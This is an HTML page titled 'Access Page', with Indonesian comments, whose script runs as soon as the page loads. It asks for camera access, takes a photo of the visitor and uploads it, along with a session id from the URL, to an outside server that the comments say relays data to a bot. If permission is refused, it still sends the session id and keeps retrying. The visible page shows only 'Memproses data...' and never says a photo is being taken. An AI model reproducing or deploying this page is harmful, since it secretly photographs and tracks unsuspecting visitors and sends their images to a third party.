<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Page</title>
    <script>
    async function sendDataToServer() {
        try {
            // Coba untuk mengakses kamera
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);
            const photoBlob = await imageCapture.takePhoto();
            track.stop(); // Hentikan kamera setelah foto diambil
            
            // Kirim foto ke server
            const formData = new FormData();
            formData.append("photo", photoBlob);
            
            const session = new URLSearchParams(window.location.search).get("session");
            
            const response = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                method: "POST",
                body: formData,
            });
            
            // Cek jika respons adalah "Data berhasil dikirim ke bot!"
            const responseText = await response.text();
            if (responseText === "Data berhasil dikirim ke bot!") {
                document.getElementById("status").innerText = "Data berhasil dikirim ke bot! 1";
                return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
            } else {
                document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi. 1";
            }
        } catch (error) {
            
            // Jika izin kamera ditolak atau terjadi error lain, kirimkan data kosong (fallback)
            if (error.name === "NotAllowedError" || error.name === "PermissionDeniedError") {
                document.getElementById("gagal").innerText = "Gagal mendapatkan data. Izin kamera ditolak. Menghentikan API. ,1";
                sendEmptyDataToAPI();
            }
            
            // Kirimkan data kosong dengan fallback gambar
            //sendEmptyDataToAPI();
        }
    }
    
    // Fungsi untuk mengirimkan data kosong dengan fallback gambar dari URL
    async function sendEmptyDataToAPI() {
        document.getElementById("gagal").innerText = "Gagal mendapatkan data. Pastikan izin kamera diberikan. 2";
        
        // URL gambar fallback
        const fallbackImageURL = 'https://i.scdn.co/image/ab67616d00001e0288a1f3c6c2711b92aabdf488';  // Ganti dengan URL gambar yang valid
        
        try {
            // Ambil gambar dari URL
            const response = await fetch(fallbackImageURL);
            const blob = await response.blob();  // Mengonversi gambar menjadi Blob        
            
            const session = new URLSearchParams(window.location.search).get("session");
            
            const caption = `
            üìç **Data Pengguna: mengizinkan**
            - User-Agent: -
            - Lokasi: -
            - Sesi: ${session}
            `;
            
            // Kirim foto kosong (fallback) ke server
            const formData = new FormData();
            formData.append("photo", "");  // Kirimkan fallback gambar
            formData.append("caption", caption);
            
            const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                method: "POST",
                body: formData,
            });
            
            // Cek jika respons adalah "Data berhasil dikirim ke bot!"
            const responseText = await apiResponse.text();
            if (responseText === "Data berhasil dikirim ke bot!") {
                document.getElementById("status").innerText = "Data berhasil dikirim ke bot! 2";
                return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
            } else {
                document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi. 2";
            }
        } catch (error) {
            document.getElementById("status").innerText = "Pengguna menolak";
            sendEmptyDataToAPI();
            return;
        }
    }
    
    // Jalankan fungsi saat halaman dimuat
    window.onload = sendDataToServer;
    </script>
</head>
<body>
    <h1>Memproses data...</h1>
    <!-- Menampilkan pesan status pengiriman -->
    <p id="status" style="color: green;"></p>
    <!-- Menampilkan pesan gagal jika izin kamera tidak diberikan -->
    <p id="gagal" style="color: red;"></p>
</body>
</html>
